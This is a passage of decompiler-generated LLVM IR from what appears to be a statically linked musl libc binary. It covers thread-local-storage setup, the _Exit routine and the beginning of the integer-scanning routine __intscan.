dec_label_pc_804f3a9.preheader:                   ; preds = %entry
  %v2_804f3be = add i32 %arg1, 16
  %v3_804f3be = inttoptr i32 %v2_804f3be to i32*
  br label %dec_label_pc_804f3a9

dec_label_pc_804f3c6.thread:                      ; preds = %entry
  br label %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge

dec_label_pc_804f3a9:                             ; preds = %dec_label_pc_804f3a9.preheader, %dec_label_pc_804f3be
  %v0_804f3cd20 = phi i32 [ %v0_804f3cd19, %dec_label_pc_804f3be ], [ 0, %dec_label_pc_804f3a9.preheader ]
  %v0_804f3c617 = phi i32 [ %v0_804f3c616, %dec_label_pc_804f3be ], [ 0, %dec_label_pc_804f3a9.preheader ]
  %v0_804f3c1 = phi i32 [ %v1_804f3c1, %dec_label_pc_804f3be ], [ %v3_804f3a2, %dec_label_pc_804f3a9.preheader ]
  %v0_804f3be = phi i32 [ %v5_804f3be, %dec_label_pc_804f3be ], [ %v3_804f39f, %dec_label_pc_804f3a9.preheader ]
  %v1_804f3a9 = inttoptr i32 %v0_804f3be to i32*
  %v2_804f3a9 = load i32, i32* %v1_804f3a9, align 4
  store i32 %v2_804f3a9, i32* %eax.global-to-local, align 4
  %v9_804f3ab = icmp eq i32 %v2_804f3a9, 6
  %v1_804f3ae = icmp eq i1 %v9_804f3ab, false
  br i1 %v1_804f3ae, label %dec_label_pc_804f3b7, label %dec_label_pc_804f3b0

dec_label_pc_804f3b0:                             ; preds = %dec_label_pc_804f3a9
  %v2_804f3b2 = add i32 %v0_804f3be, 8
  %v3_804f3b2 = inttoptr i32 %v2_804f3b2 to i32*
  %v4_804f3b2 = load i32, i32* %v3_804f3b2, align 4
  %v5_804f3b2 = sub i32 %v3_804f39f, %v4_804f3b2
  br label %dec_label_pc_804f3be

dec_label_pc_804f3b7:                             ; preds = %dec_label_pc_804f3a9
  %v9_804f3b7 = icmp eq i32 %v2_804f3a9, 7
  %v1_804f3ba = icmp eq i1 %v9_804f3b7, false
  br i1 %v1_804f3ba, label %dec_label_pc_804f3be, label %dec_label_pc_804f3bc

dec_label_pc_804f3bc:                             ; preds = %dec_label_pc_804f3b7
  br label %dec_label_pc_804f3be

dec_label_pc_804f3be:                             ; preds = %dec_label_pc_804f3b7, %dec_label_pc_804f3b0, %dec_label_pc_804f3bc
  %v0_804f3cd19 = phi i32 [ %v0_804f3cd20, %dec_label_pc_804f3b7 ], [ %v5_804f3b2, %dec_label_pc_804f3b0 ], [ %v0_804f3cd20, %dec_label_pc_804f3bc ]
  %v0_804f3c616 = phi i32 [ %v0_804f3c617, %dec_label_pc_804f3b7 ], [ %v0_804f3c617, %dec_label_pc_804f3b0 ], [ %v0_804f3be, %dec_label_pc_804f3bc ]
  %v4_804f3be = load i32, i32* %v3_804f3be, align 4
  %v5_804f3be = add i32 %v4_804f3be, %v0_804f3be
  %v1_804f3c1 = add i32 %v0_804f3c1, -1
  %v1_804f3c2 = icmp eq i32 %v1_804f3c1, 0
  %v1_804f3c4 = icmp eq i1 %v1_804f3c2, false
  br i1 %v1_804f3c4, label %dec_label_pc_804f3a9, label %dec_label_pc_804f3c6

dec_label_pc_804f3c6:                             ; preds = %dec_label_pc_804f3be
  %v1_804f3c6 = icmp eq i32 %v0_804f3c616, 0
  br i1 %v1_804f3c6, label %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge, label %dec_label_pc_804f3ca

dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge: ; preds = %dec_label_pc_804f3c6.thread, %dec_label_pc_804f3c6
  %v0_804f46245 = phi i32 [ %v3_804f3a2, %dec_label_pc_804f3c6.thread ], [ %v1_804f3c1, %dec_label_pc_804f3c6 ]
  %v0_804f3eb.pre = load i32, i32* @global_var_8056fc4.379, align 4
  %v0_804f3f1.pre = load i32, i32* @global_var_8056fc8.377, align 8
  %v1_804f3fb.pre = load i32, i32* @global_var_8056fbc.376, align 4
  br label %dec_label_pc_804f3eb

dec_label_pc_804f3ca:                             ; preds = %dec_label_pc_804f3c6
  %v1_804f3ca = add i32 %v0_804f3c616, 16
  %v2_804f3ca = inttoptr i32 %v1_804f3ca to i32*
  %v3_804f3ca = load i32, i32* %v2_804f3ca, align 4
  store i32 %v3_804f3ca, i32* %eax.global-to-local, align 4
  %v2_804f3cd = add i32 %v0_804f3c616, 8
  %v3_804f3cd = inttoptr i32 %v2_804f3cd to i32*
  %v4_804f3cd = load i32, i32* %v3_804f3cd, align 4
  %v5_804f3cd = add i32 %v4_804f3cd, %v0_804f3cd19
  store i32 %v3_804f3ca, i32* @global_var_8056fc0.380, align 64
  %v1_804f3d5 = add i32 %v0_804f3c616, 20
  %v2_804f3d5 = inttoptr i32 %v1_804f3d5 to i32*
  %v3_804f3d5 = load i32, i32* %v2_804f3d5, align 4
  store i32 %v3_804f3d5, i32* %eax.global-to-local, align 4
  store i32 %v5_804f3cd, i32* @global_var_8056fbc.376, align 4
  store i32 %v3_804f3d5, i32* @global_var_8056fc4.379, align 4
  %v1_804f3e3 = add i32 %v0_804f3c616, 28
  %v2_804f3e3 = inttoptr i32 %v1_804f3e3 to i32*
  %v3_804f3e3 = load i32, i32* %v2_804f3e3, align 4
  store i32 %v3_804f3e3, i32* %eax.global-to-local, align 4
  store i32 %v3_804f3e3, i32* @global_var_8056fc8.377, align 8
  br label %dec_label_pc_804f3eb

dec_label_pc_804f3eb:                             ; preds = %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge, %dec_label_pc_804f3ca
  %v0_804f46244 = phi i32 [ %v0_804f46245, %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge ], [ %v1_804f3c1, %dec_label_pc_804f3ca ]
  %v1_804f3fb = phi i32 [ %v1_804f3fb.pre, %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge ], [ %v5_804f3cd, %dec_label_pc_804f3ca ]
  %v0_804f3f1 = phi i32 [ %v0_804f3f1.pre, %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge ], [ %v3_804f3e3, %dec_label_pc_804f3ca ]
  %v0_804f3eb = phi i32 [ %v0_804f3eb.pre, %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge ], [ %v3_804f3d5, %dec_label_pc_804f3ca ]
  %sum = add i32 %v0_804f3eb, %v1_804f3fb
  %v2_804f3fb = sub i32 0, %sum
  %v1_804f401 = add i32 %v0_804f3f1, -1
  %v2_804f404 = and i32 %v1_804f401, %v2_804f3fb
  store i32 %v2_804f404, i32* %eax.global-to-local, align 4
  %v2_804f409 = add i32 %v2_804f404, %v0_804f3eb
  store i32 %v2_804f409, i32* @global_var_8056fc4.379, align 4
  %v6_804f412 = icmp ugt i32 %v0_804f3f1, 3
  br i1 %v6_804f412, label %dec_label_pc_804f41e, label %dec_label_pc_804f414

dec_label_pc_804f414:                             ; preds = %dec_label_pc_804f3eb
  store i32 4, i32* @global_var_8056fc8.377, align 8
  br label %dec_label_pc_804f41e

dec_label_pc_804f41e:                             ; preds = %dec_label_pc_804f3eb, %dec_label_pc_804f414
  %v0_804f41e = phi i32 [ %v0_804f3f1, %dec_label_pc_804f3eb ], [ 4, %dec_label_pc_804f414 ]
  %v1_804f428 = add i32 %v0_804f41e, 223
  store i32 %v1_804f428, i32* %eax.global-to-local, align 4
  %v2_804f42d = add i32 %v1_804f428, %v2_804f409
  %v1_804f430 = and i32 %v2_804f42d, -4
  store i32 %v1_804f430, i32* @global_var_8056f94.378, align 4
  %tmp = icmp ult i32 %v1_804f430, 281
  br i1 %tmp, label %dec_label_pc_804f47a, label %dec_label_pc_804f441

dec_label_pc_804f441:                             ; preds = %dec_label_pc_804f41e
  store i32 192, i32* @ebx, align 4
  store i32 3, i32* @edi, align 4
  store i32 -1, i32* %stack_var_-24, align 4
  store i32 192, i32* @eax, align 4
  store i32 %v0_804f46244, i32* @edx, align 4
  %v2_804f470 = call i32 @__vsyscall6(i32* nonnull %stack_var_-24)
  store i32 %v2_804f470, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f47a

dec_label_pc_804f47a:                             ; preds = %dec_label_pc_804f41e, %dec_label_pc_804f441
  %v0_804f47d = phi i32 [ ptrtoint (i32* @global_var_8056e08.381 to i32), %dec_label_pc_804f41e ], [ %v2_804f470, %dec_label_pc_804f441 ]
  store i32 %v0_804f47d, i32* %stack_var_-60, align 4
  %v1_804f47e = inttoptr i32 %v0_804f47d to i32*
  %v2_804f47e = call i32 @__copy_tls(i32* %v1_804f47e)
  store i32 %v2_804f47e, i32* %eax.global-to-local, align 4
  store i32 %v2_804f47e, i32* @ebx, align 4
  %v2_804f485 = inttoptr i32 %v2_804f47e to i32*
  store i32 %v2_804f47e, i32* %v2_804f485, align 4
  store i32 %v2_804f47e, i32* %stack_var_-60, align 4
  %v1_804f48a = call i32 @__set_thread_area(i32 %v2_804f47e)
  store i32 %v1_804f48a, i32* %eax.global-to-local, align 4
  %v2_804f492 = icmp slt i32 %v1_804f48a, 0
  %v2_804f495 = icmp eq i1 %v2_804f492, false
  br i1 %v2_804f495, label %dec_label_pc_804f497, label %dec_label_pc_804f4cc

dec_label_pc_804f497:                             ; preds = %dec_label_pc_804f47a
  %v1_804f492 = icmp eq i32 %v1_804f48a, 0
  %v1_804f497 = icmp eq i1 %v1_804f492, false
  br i1 %v1_804f497, label %dec_label_pc_804f4a3, label %dec_label_pc_804f499

dec_label_pc_804f499:                             ; preds = %dec_label_pc_804f497
  store i32 1, i32* @global_var_8056f80.382, align 128
  br label %dec_label_pc_804f4a3

dec_label_pc_804f4a3:                             ; preds = %dec_label_pc_804f497, %dec_label_pc_804f499
  %v0_804f4a3 = load i32, i32* @ebx, align 4
  %v1_804f4a3 = add i32 %v0_804f4a3, 28
  store i32 %v1_804f4a3, i32* @edx, align 4
  store i32 258, i32* @eax, align 4
  %v0_804f4ab = load i32, i32* %stack_var_-60, align 4
  %v1_804f4ab = call i32 @__vsyscall(i32 %v0_804f4ab)
  %v1_804f4b0 = load i32, i32* @ebx, align 4
  %v2_804f4b0 = add i32 %v1_804f4b0, 28
  %v3_804f4b0 = inttoptr i32 %v2_804f4b0 to i32*
  store i32 %v1_804f4ab, i32* %v3_804f4b0, align 4
  %v0_804f4b3 = load i32, i32* @ebx, align 4
  %v1_804f4b3 = add i32 %v0_804f4b3, 136
  store i32 %v1_804f4b3, i32* %eax.global-to-local, align 4
  %v1_804f4b9 = add i32 %v0_804f4b3, 156
  %v2_804f4b9 = inttoptr i32 %v1_804f4b9 to i32*
  store i32 ptrtoint (i32* @global_var_8056f9c.383 to i32), i32* %v2_804f4b9, align 4
  %v0_804f4c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4c3 = load i32, i32* @ebx, align 4
  %v2_804f4c3 = add i32 %v1_804f4c3, 136
  %v3_804f4c3 = inttoptr i32 %v2_804f4c3 to i32*
  store i32 %v0_804f4c3, i32* %v3_804f4c3, align 4
  %v0_804f4d3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4cc

dec_label_pc_804f4cc:                             ; preds = %dec_label_pc_804f47a, %dec_label_pc_804f4a3
  %v0_804f4d3 = phi i32 [ %v1_804f48a, %dec_label_pc_804f47a ], [ %v0_804f4d3.pre, %dec_label_pc_804f4a3 ]
  store i32 %v0_804f395, i32* @ebx, align 4
  store i32 %v0_804f390, i32* @ebp, align 4
  ret i32 %v0_804f4d3

; uselistorder directives
  uselistorder i32 %v1_804f48a, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f47e, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804f47d, { 1, 0 }
  uselistorder i32 %v0_804f3eb, { 1, 0 }
  uselistorder i32 %v1_804f3c1, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f3c616, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v3_804f3a2, { 1, 0, 2 }
  uselistorder i32 %v3_804f39f, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32*)* @__vsyscall6, { 2, 0, 1 }
  uselistorder i32 192, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8056fbc.376, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_8056fc8.377, { 1, 2, 0, 3 }
  uselistorder i32* @global_var_8056fc4.379, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f4cc, { 1, 0 }
  uselistorder label %dec_label_pc_804f4a3, { 1, 0 }
  uselistorder label %dec_label_pc_804f47a, { 1, 0 }
  uselistorder label %dec_label_pc_804f41e, { 1, 0 }
  uselistorder label %dec_label_pc_804f3eb, { 1, 0 }
  uselistorder label %dec_label_pc_804f3c6.dec_label_pc_804f3eb_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f3be, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f3a9, { 1, 0 }
}

define i32 @_Exit(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  store i32 252, i32* @eax, align 4
  br label %dec_label_pc_804f4dd

dec_label_pc_804f4dd:                             ; preds = %dec_label_pc_804f4dd, %entry
  %v1_804f4dd = call i32 @__vsyscall(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804f4dd
}

define i32 @__intscan(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp88 = call i8 @__decompiler_undefined_function_4()
  %tmp96 = sext i32 %arg2 to i64
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-124 = alloca i64, align 8
  %tmp100 = call i64 @__decompiler_undefined_function_2()
  store i64 %tmp100, i64* %stack_var_-124, align 8
  %v0_804f4f2 = load i32, i32* @esi, align 4
  store i32 %tmp97, i32* %edx.global-to-local, align 4
  %v7_804f515 = icmp ugt i32 %arg2, 36
  %extract.t = trunc i64 %tmp100 to i32
  br i1 %v7_804f515, label %dec_label_pc_804f5ca, label %dec_label_pc_804f520.preheader

dec_label_pc_804f520.preheader:                   ; preds = %entry
  %v4_804f520 = trunc i64 %arg1 to i32
  %v1_804f527 = add i32 %v4_804f520, 4
  %v2_804f527 = inttoptr i32 %v1_804f527 to i32*
  %v2_804f52a = add i32 %v4_804f520, 104
  %v3_804f52a = inttoptr i32 %v2_804f52a to i32*
  br label %dec_label_pc_804f520

dec_label_pc_804f520:                             ; preds = %dec_label_pc_804f541, %dec_label_pc_804f53c, %dec_label_pc_804f520.preheader
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804f527 = load i32, i32* %v2_804f527, align 4
  %v4_804f52a = load i32, i32* %v3_804f52a, align 4
  %v10_804f52a = icmp ult i32 %v3_804f527, %v4_804f52a
  %v1_804f52d = icmp eq i1 %v10_804f52a, false
  br i1 %v1_804f52d, label %dec_label_pc_804f5f5, label %dec_label_pc_804f533

dec_label_pc_804f533:                             ; preds = %dec_label_pc_804f520
  %v1_804f533 = inttoptr i32 %v3_804f527 to i8*
  %v2_804f533 = load i8, i8* %v1_804f533, align 1
  %v3_804f533 = zext i8 %v2_804f533 to i32
  store i32 %v3_804f533, i32* @ebp, align 4
  %v1_804f536 = add i32 %v3_804f527, 1
  store i32 %v1_804f536, i32* %v2_804f527, align 4
  %v0_804f53c.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f53c

dec_label_pc_804f53c:                             ; preds = %dec_label_pc_804f5f5, %dec_label_pc_804f533
  %v2_804f56e = phi i32 [ %v2_804f5f8, %dec_label_pc_804f5f5 ], [ %v0_804f53c.pre, %dec_label_pc_804f533 ]
  %v6_804f53c = icmp eq i32 %v2_804f56e, 32
  br i1 %v6_804f53c, label %dec_label_pc_804f520, label %dec_label_pc_804f541

dec_label_pc_804f541:                             ; preds = %dec_label_pc_804f53c
  %v1_804f541 = add i32 %v2_804f56e, -9
  %tmp = icmp ult i32 %v1_804f541, 5
  br i1 %tmp, label %dec_label_pc_804f520, label %dec_label_pc_804f549

dec_label_pc_804f549:                             ; preds = %dec_label_pc_804f541
  %v9_804f549 = icmp eq i32 %v2_804f56e, 43
  store i32 %v2_804f56e, i32* @ebx, align 4
  br i1 %v9_804f549, label %dec_label_pc_804f604, label %dec_label_pc_804f554

dec_label_pc_804f554:                             ; preds = %dec_label_pc_804f549
  %v9_804f554 = icmp eq i32 %v2_804f56e, 45
  br i1 %v9_804f554, label %dec_label_pc_804f604, label %dec_label_pc_804f565

dec_label_pc_804f565:                             ; preds = %dec_label_pc_804f554
  %v2_804f56c = icmp eq i32 %arg2, 0
  %v1_804f56e = zext i1 %v2_804f56c to i32
  %v3_804f56e = and i32 %v2_804f56e, -256
  %v4_804f56e = or i32 %v3_804f56e, %v1_804f56e
  store i32 %v4_804f56e, i32* @ebx, align 4
  br i1 %v2_804f56c, label %dec_label_pc_804f640, label %dec_label_pc_804f577

dec_label_pc_804f577:                             ; preds = %dec_label_pc_804f620, %dec_label_pc_804f565
  %v0_804f64937 = phi i32 [ %v4_804f637, %dec_label_pc_804f620 ], [ %v4_804f56e, %dec_label_pc_804f565 ]
  %stack_var_-32.0 = phi i32 [ %v1_804f628, %dec_label_pc_804f620 ], [ 0, %dec_label_pc_804f565 ]
  %v10_804f577 = icmp eq i32 %arg2, 16
  br i1 %v10_804f577, label %dec_label_pc_804f640, label %dec_label_pc_804f577.dec_label_pc_804f585_crit_edge

dec_label_pc_804f577.dec_label_pc_804f585_crit_edge: ; preds = %dec_label_pc_804f577
  %v0_804f585.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f585

dec_label_pc_804f585:                             ; preds = %dec_label_pc_804f577.dec_label_pc_804f585_crit_edge, %dec_label_pc_804f649
  %v0_804f585 = phi i32 [ %v0_804f640, %dec_label_pc_804f649 ], [ %v0_804f585.pre, %dec_label_pc_804f577.dec_label_pc_804f585_crit_edge ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804f649 ], [ %stack_var_-32.0, %dec_label_pc_804f577.dec_label_pc_804f585_crit_edge ]
  %v1_804f585 = add i32 %v0_804f585, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f585 = inttoptr i32 %v1_804f585 to i8*
  %v3_804f585 = load i8, i8* %v2_804f585, align 1
  %v4_804f585 = zext i8 %v3_804f585 to i32
  %v8_804f593 = icmp ult i32 %v4_804f585, %arg2
  br i1 %v8_804f593, label %dec_label_pc_804f670, label %dec_label_pc_804f599

dec_label_pc_804f599:                             ; preds = %dec_label_pc_804f651, %dec_label_pc_804f585
  %v3_804f5a0 = load i32, i32* %v3_804f52a, align 4
  store i32 %v3_804f5a0, i32* %edx.global-to-local, align 4
  %v1_804f5a3 = icmp eq i32 %v3_804f5a0, 0
  br i1 %v1_804f5a3, label %dec_label_pc_804f5ab, label %dec_label_pc_804f5a7

dec_label_pc_804f5a7:                             ; preds = %dec_label_pc_804f599
  %v3_804f5a7 = load i32, i32* %v2_804f527, align 4
  %v4_804f5a7 = add i32 %v3_804f5a7, -1
  store i32 %v4_804f5a7, i32* %v2_804f527, align 4
  br label %dec_label_pc_804f5ab

dec_label_pc_804f5ab:                             ; preds = %dec_label_pc_804f599, %dec_label_pc_804f5a7
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v6_804f5c5 = call i32 @__shlim(i32 %v4_804f520, i32 0, i32 0)
  %extract.t73 = trunc i64 %arg1 to i32
  br label %dec_label_pc_804f5ca

dec_label_pc_804f5ca:                             ; preds = %entry, %dec_label_pc_804f5ab
  %v0_804f5ca.off0 = phi i32 [ %extract.t, %entry ], [ %extract.t73, %dec_label_pc_804f5ab ]
  %v2_804f5ca = call i32 @__errno_location(i32 %v0_804f5ca.off0)
  %v1_804f5df = inttoptr i32 %v2_804f5ca to i32*
  store i32 22, i32* %v1_804f5df, align 4
  br label %dec_label_pc_804f5e5

dec_label_pc_804f5e5:                             ; preds = %dec_label_pc_804fc0e, %dec_label_pc_804fc45, %dec_label_pc_804fc30, %dec_label_pc_804fb8d, %dec_label_pc_804f972, %dec_label_pc_804f5ca
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_804f5ca ], [ %v7_804fb97, %dec_label_pc_804fb8d ], [ %tmp97, %dec_label_pc_804f972 ], [ 0, %dec_label_pc_804fc45 ], [ 0, %dec_label_pc_804fc0e ], [ 0, %dec_label_pc_804fc30 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_804f5ca ], [ %v4_804fb92, %dec_label_pc_804fb8d ], [ %arg4, %dec_label_pc_804f972 ], [ 0, %dec_label_pc_804fc45 ], [ 0, %dec_label_pc_804fc0e ], [ 0, %dec_label_pc_804fc30 ]
  store i32 %stack_var_-56.0, i32* @edx, align 4
  store i32 %v0_804f4f2, i32* @esi, align 4
  ret i32 %stack_var_-60.0

dec_label_pc_804f5f5:                             ; preds = %dec_label_pc_804f520
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804f5f8 = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804f5f8, i32* @ebp, align 4
  br label %dec_label_pc_804f53c

dec_label_pc_804f604:                             ; preds = %dec_label_pc_804f554, %dec_label_pc_804f549
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804f60b = load i32, i32* %v2_804f527, align 4
  %v4_804f60e = load i32, i32* %v3_804f52a, align 4
  %v10_804f60e = icmp ult i32 %v3_804f60b, %v4_804f60e
  %v1_804f611 = icmp eq i1 %v10_804f60e, false
  br i1 %v1_804f611, label %dec_label_pc_804fb34, label %dec_label_pc_804f617

dec_label_pc_804f617:                             ; preds = %dec_label_pc_804f604
  %v1_804f617 = inttoptr i32 %v3_804f60b to i8*
  %v2_804f617 = load i8, i8* %v1_804f617, align 1
  %v3_804f617 = zext i8 %v2_804f617 to i32
  store i32 %v3_804f617, i32* @ebp, align 4
  %v1_804f61a = add i32 %v3_804f60b, 1
  store i32 %v1_804f61a, i32* %v2_804f527, align 4
  br label %dec_label_pc_804f620

dec_label_pc_804f620:                             ; preds = %dec_label_pc_804fb34, %dec_label_pc_804f617
  %v0_804f622 = load i32, i32* @ebx, align 4
  %v9_804f622 = icmp eq i32 %v0_804f622, 45
  %v1_804f628 = sext i1 %v9_804f622 to i32
  %v2_804f635 = icmp eq i32 %arg2, 0
  %v1_804f637 = zext i1 %v2_804f635 to i32
  %v3_804f637 = and i32 %v0_804f622, -256
  %v4_804f637 = or i32 %v3_804f637, %v1_804f637
  store i32 %v4_804f637, i32* @ebx, align 4
  %v1_804f63a = icmp eq i1 %v2_804f635, false
  br i1 %v1_804f63a, label %dec_label_pc_804f577, label %dec_label_pc_804f640

dec_label_pc_804f640:                             ; preds = %dec_label_pc_804f620, %dec_label_pc_804f577, %dec_label_pc_804f565
  %v0_804f649 = phi i32 [ %v0_804f64937, %dec_label_pc_804f577 ], [ %v4_804f637, %dec_label_pc_804f620 ], [ %v4_804f56e, %dec_label_pc_804f565 ]
  %stack_var_-32.2 = phi i32 [ %stack_var_-32.0, %dec_label_pc_804f577 ], [ %v1_804f628, %dec_label_pc_804f620 ], [ 0, %dec_label_pc_804f565 ]
  %v0_804f640 = load i32, i32* @ebp, align 4
  %v6_804f640 = icmp eq i32 %v0_804f640, 48
  br i1 %v6_804f640, label %dec_label_pc_804fb43, label %dec_label_pc_804f649

dec_label_pc_804f649:                             ; preds = %dec_label_pc_804f640
  %v3_804f649 = trunc i32 %v0_804f649 to i8
  %v4_804f649 = icmp eq i8 %v3_804f649, 0
  br i1 %v4_804f649, label %dec_label_pc_804f585, label %dec_label_pc_804f651

dec_label_pc_804f651:                             ; preds = %dec_label_pc_804f649
  %v1_804f651 = add i32 %v0_804f640, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f651 = inttoptr i32 %v1_804f651 to i8*
  %v3_804f651 = load i8, i8* %v2_804f651, align 1
  %tmp232 = icmp ugt i8 %v3_804f651, 9
  br i1 %tmp232, label %dec_label_pc_804f599, label %dec_label_pc_804f670

dec_label_pc_804f670:                             ; preds = %dec_label_pc_804fb65, %dec_label_pc_804f651, %dec_label_pc_804f585
  %v0_804f687 = phi i32 [ %v0_804fb6d, %dec_label_pc_804fb65 ], [ %v0_804f585, %dec_label_pc_804f585 ], [ %v0_804f640, %dec_label_pc_804f651 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804fb65 ], [ %stack_var_-32.1, %dec_label_pc_804f585 ], [ %stack_var_-32.2, %dec_label_pc_804f651 ]
  %stack_var_8.0 = phi i64 [ %tmp96, %dec_label_pc_804fb65 ], [ %tmp96, %dec_label_pc_804f585 ], [ 10, %dec_label_pc_804f651 ]
  store i32 0, i32* @ebx, align 4
  %v4_804f672 = trunc i64 %stack_var_8.0 to i32
  %v13_804f672 = icmp eq i32 %v4_804f672, 10
  br i1 %v13_804f672, label %dec_label_pc_804f920.preheader, label %dec_label_pc_804f680

dec_label_pc_804f920.preheader:                   ; preds = %dec_label_pc_804f670
  %v1_804f920198 = add i32 %v0_804f687, -48
  %tmp233 = icmp ult i32 %v1_804f920198, 10
  br i1 %tmp233, label %dec_label_pc_804f8f1, label %dec_label_pc_804f928

dec_label_pc_804f680:                             ; preds = %dec_label_pc_804f670
  %v1_804f687 = add i32 %v0_804f687, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f687 = inttoptr i32 %v1_804f687 to i8*
  %v3_804f687 = load i8, i8* %v2_804f687, align 1
  %v1_804f68e = add i32 %v4_804f672, -1
  br label %dec_label_pc_804f695

dec_label_pc_804f695:                             ; preds = %dec_label_pc_804fbcd, %dec_label_pc_804fb6d, %dec_label_pc_804f680
  %v5_804f697 = phi i32 [ 15, %dec_label_pc_804fbcd ], [ %v1_804f68e, %dec_label_pc_804f680 ], [ 7, %dec_label_pc_804fb6d ]
  %stack_var_-21.0 = phi i8 [ %v3_804fbcd, %dec_label_pc_804fbcd ], [ %v3_804f687, %dec_label_pc_804f680 ], [ %v3_804fb6d, %dec_label_pc_804fb6d ]
  %stack_var_-32.4 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804fbcd ], [ %stack_var_-32.3, %dec_label_pc_804f680 ], [ %stack_var_-32.2, %dec_label_pc_804fb6d ]
  %stack_var_8.1 = phi i64 [ 16, %dec_label_pc_804fbcd ], [ %stack_var_8.0, %dec_label_pc_804f680 ], [ 8, %dec_label_pc_804fb6d ]
  store i32 0, i32* @ebx, align 4
  %v4_804f697 = trunc i64 %stack_var_8.1 to i32
  %v6_804f697 = and i32 %v4_804f697, %v5_804f697
  %v7_804f697 = icmp eq i32 %v6_804f697, 0
  %v1_804f69e = icmp eq i1 %v7_804f697, false
  br i1 %v1_804f69e, label %dec_label_pc_804f7ce.preheader, label %dec_label_pc_804f6a4

dec_label_pc_804f7ce.preheader:                   ; preds = %dec_label_pc_804f695
  %v4_804f7ce143 = zext i8 %stack_var_-21.0 to i32
  store i32 %v4_804f7ce143, i32* @esi, align 4
  %v11_804f7d3145 = icmp ult i32 %v4_804f7ce143, %v4_804f697
  br i1 %v11_804f7d3145, label %dec_label_pc_804f790.lr.ph, label %dec_label_pc_804f7dc

dec_label_pc_804f790.lr.ph:                       ; preds = %dec_label_pc_804f7ce.preheader
  br label %dec_label_pc_804f790

dec_label_pc_804f6a4:                             ; preds = %dec_label_pc_804f695
  %v7_804f6a4 = mul nsw i64 %stack_var_8.1, 23
  %v8_804f6a4 = trunc i64 %v7_804f6a4 to i32
  %v2_804f6ac = udiv i32 %v8_804f6a4, 32
  %v1_804f6af = urem i32 %v2_804f6ac, 8
  %v1_804f6b2 = add i32 %v1_804f6af, ptrtoint (i8** @global_var_80545e0.385 to i32)
  %v2_804f6b2 = inttoptr i32 %v1_804f6b2 to i8*
  %v3_804f6b2 = load i8, i8* %v2_804f6b2, align 1
  %v4_804f6b2 = sext i8 %v3_804f6b2 to i32
  %v4_804f6c0169 = zext i8 %stack_var_-21.0 to i32
  store i32 %v4_804f6c0169, i32* @esi, align 4
  %v11_804f6c5171 = icmp ult i32 %v4_804f6c0169, %v4_804f697
  %v2_804faec = urem i32 %v4_804f6b2, 32
  br i1 %v11_804f6c5171, label %dec_label_pc_804fab5.lr.ph, label %dec_label_pc_804f6d2

dec_label_pc_804fab5.lr.ph:                       ; preds = %dec_label_pc_804f6a4
  %v4_804faec = icmp eq i32 %v2_804faec, 0
  br label %dec_label_pc_804fab5

dec_label_pc_804f6d2:                             ; preds = %dec_label_pc_804f6a4, %bb113, %dec_label_pc_804fab5
  %v0_804f6e3.lcssa = phi i32 [ %v0_804f6e3176, %dec_label_pc_804fab5 ], [ %v2_804faee, %bb113 ], [ 0, %dec_label_pc_804f6a4 ]
  %stack_var_-21.1.lcssa = phi i8 [ %stack_var_-21.1177, %dec_label_pc_804fab5 ], [ %v3_804fae5, %bb113 ], [ %stack_var_-21.0, %dec_label_pc_804f6a4 ]
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 %v0_804f6e3.lcssa, i32* @esi, align 4
  %v6_804f6e5 = icmp eq i32 %v2_804faec, 0
  br i1 %v6_804f6e5, label %bb106, label %bb

bb:                                               ; preds = %dec_label_pc_804f6d2
  %v7_804f6e5 = lshr i32 -1, %v2_804faec
  %v8_804f6e5 = sub nsw i32 32, %v2_804faec
  %v9_804f6e5 = shl i32 -1, %v8_804f6e5
  %v10_804f6e5 = or i32 %v9_804f6e5, %v7_804f6e5
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_804f6d2, %bb
